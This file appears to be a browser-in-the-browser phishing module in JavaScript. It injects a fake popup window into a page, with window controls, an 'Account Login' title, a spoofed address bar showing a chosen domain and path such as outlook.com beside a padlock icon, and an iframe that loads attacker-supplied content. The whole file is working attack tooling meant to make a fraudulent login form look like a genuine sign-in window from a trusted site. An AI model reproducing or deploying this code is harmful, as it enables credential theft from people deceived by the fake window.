/*
	bibModule.js
	Title: JavaScript Modules for BIB
	Author: bl7
	URL: *
	Github: *
*/


/*
Init div Container
@param!
    buttonID: ID for html button on main html page
    domainName: domain that will appeared (ex! outlook.com)
    domainPath:  path that will appeared (ex! /login.php)
    displayContent: page template  (source of iframe) 
    iconPath: path to icon
@return! null
*/

export function initDivContainer(buttonID,domainName,domainPath,displayContent,iconPath){ 
    
    let scvar = `
        <style>
        @font-face {
            font-family: system;
            font-style: normal;
            font-weight: 300;
            src: local(".SFNSText-Light"), local(".HelveticaNeueDeskInterface-Light"),
            local("Roboto-Light"), local("DroidSans"), local("Tahoma"),
            local(".LucidaGrandeUI"), local("Ubuntu Light"), local("Segoe UI Light");
        }

        html,
        body {
            width: 100%;
            height: 100%;
        }

        #title-bar {
            height: 31px;
            background-color: #d6dae0;
            width: 100%;
            display: flex;
            justify-content: space-between;
            user-select: none;
        }

        #logo {
            padding-left: 5px;
            vertical-align: middle;
        }

        #logo-description {
            color: black;
            font-size: 12px;
            font-family: "system";
            vertical-align: middle;
        }

        #minimize {
        color: black;
        font-size: 12px;
        padding: 9px 15px 7px 15px;
        }

        #square {
        color: black;
        font-size: 22px;
        padding: 0px 15px 5px 15px;
        }

        #exit {
        color: black;
        font-size: 15px;
        padding: 7px 17px 7px 17px;
        }

        #url-bar {
        height: 28px;
        background-color: #f1f3f4;
        width: 100%;
        display: flex;
        align-items: center;
        white-space: nowrap;
        overflow: scroll;
        text-overflow: ellipsis;
        -ms-overflow-style: none;
        scrollbar-width: none;
        border-bottom: 1px solid lightgray;
        }

        #url-bar::-webkit-scrollbar {
        display: none;
        }

        #ssl-padlock {
        user-select: none;
        padding-left: 8px;
        margin-right: 8px;
        }

        #domain-name {
        color: #000000;
        font-size: 14px;
        font-family: "system";
        }

        #domain-path {
        color: #7c7c7c;
        font-size: 14px;
        font-family: "system";
        }

        #title-bar-width {
        width: 100%;
        }

        #content {
        width: 100%;
        height: 700px;
        }

        #window {
        color: transparent;
        background-color: transparent;
        border-color: transparent;
        box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
        height: 759px; /* title bar height + content height */
        width: 40%;
        }
        </style>
    `;
    document.querySelector("head").insertAdjacentHTML('beforeend',scvar);
    console.log("don");
    
    let b = document.getElementById(buttonID);
    b.addEventListener("click",()=>{ 
         
            let divContainer = document.getElementById("DivContainer1105");
            divContainer.style = "display: true;";
            
            var minimize = document.getElementById("minimize");
            var square = document.getElementById("square");
            var exit = document.getElementById("exit");
            var titleBar = document.getElementById("title-bar");

            ////////////////// Hover listeners //////////////////
            minimize.addEventListener('mouseover', function handleMouseOver() {
              minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
              minimize.style.cursor = 'context-menu';
            });

            minimize.addEventListener('mouseout', function handleMouseOut() {
              minimize.style.backgroundColor = '#d6dae0';
              minimize.style.cursor = 'default';
            });

            square.addEventListener('mouseover', function handleMouseOver() {
              square.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
              square.style.cursor = 'context-menu';
            });

            square.addEventListener('mouseout', function handleMouseOut() {
              square.style.backgroundColor = '#d6dae0';
              square.style.cursor = 'default';
            });

            exit.addEventListener('mouseover', function handleMouseOver() {
              exit.style.backgroundColor = '#E81123';
              exit.style.cursor = 'context-menu';
            });

            exit.addEventListener('mouseout', function handleMouseOut() {
              exit.style.backgroundColor = '#d6dae0';
              exit.style.cursor = 'default';
            });

            titleBar.addEventListener('mouseover', function handleMouseOver() {
              titleBar.style.cursor = 'context-menu';
            });

            titleBar.addEventListener('mouseout', function handleMouseOver() {
              titleBar.style.cursor = 'default';
            });


            //////////////// Make window draggable start ////////////////
            // Make the DIV element draggable:
            var draggable = $('#window');
            var title = $('#title-bar');

            title.on('mousedown', function(e){
                var dr = $(draggable).addClass("drag");
                var height = dr.outerHeight();
                var width = dr.outerWidth();
                var ypos = dr.offset().top + height - e.pageY,
                xpos = dr.offset().left + width - e.pageX;
                $(document.body).on('mousemove', function(e){
                    var itop = e.pageY + ypos - height;
                    var ileft = e.pageX + xpos - width;
                    if(dr.hasClass("drag")){
                        dr.offset({top: itop,left: ileft});
                    }
                }).on('mouseup', function(e){
                        dr.removeClass("drag");
                });
            });
            //////////////// Make window draggable end ////////////////


            ////////////////// Onclick listeners //////////////////
            // X button functionality
            $("#exit").click(function(){
                   let divContainer = document.getElementById("DivContainer1105");
                    divContainer.style = "display: none;";
              });

            // Maximize button functionality
            $("#square").click(enlarge);

            function enlarge(){
              if(square.classList.contains("enlarged")){
                $("#window").css("width", "40%");
                $("#title-bar-width").css('width', '100%');
                $("#content").css("width", "100%");
                $("#square").removeClass("enlarged");
              }
              else{
                $("#window").css("width", "70%");
                $("#title-bar-width").css('width', '100%');
                $("#content").css("width", "100%");
                $("#square").addClass("enlarged");
              }
            }
        }
     
    );
    
     let srcTag =  `
     <div hight=100% width=100%  text-align: center; style="display: none;" ID="DivContainer1105" class="container">
    <div id="window">
    <!-- Title bar start -->
        <div id="title-bar-width" class="center">
        <div id="title-bar">
            <div style="margin-top:5px;">
                <img src="` + iconPath + `" width="20px" height="15px" id="logo">
                <span id="logo-description">Account Login</span>
            </div>

            <div>
                <span id="minimize">&#8212;</span>
                <span id="square">□</span>
                <span id="exit">✕</span>
            </div>
        </div>
        <div id="url-bar">
            <img src="./35sd4f6s.svg" width="20px" height="20px" id="ssl-padlock">
            <span id="domain-name">`+ domainName +`</span>
            <span id="domain-path">/`+ domainPath +`</span>
        </div>
    </div>
    <!-- Content start -->
    <iframe id="content" src="` + displayContent + `" frameBorder="0"></iframe>
    </div>
    </div>
      `;
     document.querySelector("body").insertAdjacentHTML('beforeend',srcTag);
 }
 
/*
Close open popUp

@param! non
@return! null
 */
 export function closeParentPopUp(){
    parent.document.getElementById("DivContainer1105").style = "display: none;";
 }
